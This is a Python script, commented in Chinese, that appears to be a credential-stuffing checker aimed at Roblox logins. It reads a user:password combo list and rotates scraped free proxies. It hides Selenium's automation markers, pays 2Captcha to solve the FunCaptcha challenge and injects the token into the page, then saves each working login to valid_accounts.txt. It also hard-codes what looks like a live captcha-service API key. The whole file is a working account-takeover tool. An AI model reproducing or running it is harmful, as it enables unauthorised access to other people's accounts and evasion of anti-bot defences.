import requests
import time
import random
import os
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from colorama import Fore, init

# 初始化顏色
init(autoreset=True)
magenta, red, green, reset, cyan, yellow = Fore.MAGENTA, Fore.RED, Fore.GREEN, Fore.RESET, Fore.CYAN, Fore.YELLOW

# --- 配置區 ---
API_KEY = "ada651ca3dae38bbd6d5ec71d3400002"  # 你的 2Captcha API Key
ROBLOX_PUBLIC_KEY = "47606880-07D8-4B39-9E6D-E959AD842129" # Roblox 登入專用公鑰

# --- 功能：自動抓取線上代理 ---
def get_online_proxies():
    print(f"[*] {cyan}正在從 free-proxy-list.net 獲取最新 HTTPS 代理...{reset}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = requests.get("https://free-proxy-list.net/", headers=headers, timeout=10)
        raw_site = resp.text
        
        # 簡單解析表格
        start = raw_site.find("<tbody>") + 7
        end = raw_site.find("</tbody>")
        rows = raw_site[start:end].split("<tr>")[1:]
        
        proxies = []
        for row in rows:
            cols = row.split("</td>")[:-1]
            data = [col[col.rfind(">")+1:] for col in cols]
            if len(data) > 6 and data[6] == "yes": # 只選 HTTPS
                proxies.append(f"{data[0]}:{data[1]}")
        
        print(f"[*] {green}成功獲取 {len(proxies)} 個代理！{reset}")
        return proxies
    except Exception as e:
        print(f"{red}[!] 無法獲取線上代理: {e}{reset}")
        return []

# --- 功能：2Captcha 破解 Arkose Labs ---
def solve_captcha(driver):
    try:
        print(f"\n[*] {yellow}偵測到驗證碼，正在請求 2Captcha 破解 (約需 30-90s)...{reset}")
        page_url = driver.current_url
        
        # 發送至 2Captcha
        in_url = f"http://2captcha.com/in.php?key={API_KEY}&method=funcaptcha&publickey={ROBLOX_PUBLIC_KEY}&pageurl={page_url}&json=1"
        res = requests.get(in_url).json()
        
        if res.get("status") != 1:
            print(f"{red}[!] 2Captcha 請求失敗: {res.get('request')}{reset}")
            return False
            
        task_id = res.get("request")
        
        # 輪詢結果
        for _ in range(40):
            time.sleep(5)
            res_url = f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={task_id}&json=1"
            result = requests.get(res_url).json()
            
            if result.get("status") == 1:
                token = result.get("request")
                print(f"[*] {green}驗證破解成功！正在注入 Token...{reset}")
                # 注入 Token
                script = f'parent.postMessage(JSON.stringify({{ eventId: "challenge-complete", payload: {{ sessionToken: "{token}" }} }}), "*");'
                driver.execute_script(script)
                time.sleep(2)
                return True
            print(f"[*] {cyan}等待破解中...({(_+1)*5}s){reset}", end="\r")
        return False
    except Exception as e:
        print(f"{red}[!] 破解異常: {e}{reset}")
        return False

# --- 功能：建立瀏覽器 ---
def create_driver(proxy=None):
    options = webdriver.ChromeOptions()
    options.add_argument("--window-size=1280,720")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    if proxy:
        options.add_argument(f'--proxy-server={proxy}')
    
    # 請確保 chromedriver.exe 在同目錄
    service = Service(executable_path="chromedriver.exe")
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(30)
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    return driver

# --- 主程式 ---
def main():
    root = tk.Tk(); root.withdraw()
    print(f"[*] {cyan}請選擇帳號名單...{reset}")
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if not file_path: return

    # 1. 自動去重處理
    with open(file_path, "r", encoding="utf-8") as f:
        raw_list = [line.strip() for line in f if ":" in line]
    combolist = list(dict.fromkeys(raw_list))
    print(f"[*] {green}載入完成。原始: {len(raw_list)} -> 去重後: {len(combolist)}{reset}")

    # 2. 獲取代理
    proxies = get_online_proxies()
    if not proxies: proxies = [None]
    p_idx = 0

    driver = create_driver(proxies[p_idx])

    # 3. 開始檢查
    for c_idx, combo in enumerate(combolist):
        user, pw = combo.split(":", 1)
        
        while True:
            try:
                print(f"[{c_idx+1}/{len(combolist)}] {magenta}Checking: {user} | IP: {proxies[p_idx] or 'Local'}{reset}", end="\r")
                driver.get("https://www.roblox.com/Login")
                time.sleep(random.uniform(2, 4))

                # 檢查是否有驗證碼
                if "Verification" in driver.page_source or len(driver.find_elements(By.ID, "arkose-type-frame")) > 0:
                    if not solve_captcha(driver):
                        raise Exception("Captcha solve failed")

                # 輸入帳密
                driver.find_element(By.ID, "login-username").send_keys(user)
                driver.find_element(By.ID, "login-password").send_keys(pw)
                driver.find_element(By.ID, "login-button").click()
                
                time.sleep(7) # 等待登入結果

                if "home" in driver.current_url or "dashboard" in driver.current_url:
                    print(f"{green}[+] GOOD: {combo}{reset}                               ")
                    with open("valid_accounts.txt", "a") as f: f.write(combo + "\n")
                    driver.delete_all_cookies()
                    break
                elif driver.find_elements(By.ID, "login-form-error"):
                    print(f"{red}[-] BAD: {combo}{reset}                                ")
                    break
                else:
                    raise Exception("Slow connection / Blocked")

            except Exception as e:
                print(f"\n{yellow}[!] 代理故障或受限 ({e})，更換 IP 中...{reset}")
                driver.quit()
                p_idx = (p_idx + 1) % len(proxies)
                driver = create_driver(proxies[p_idx])

    print(f"\n{green}[*] 全部檢查完畢！結果儲存於 valid_accounts.txt{reset}")
    driver.quit()

if __name__ == "__main__":
    main()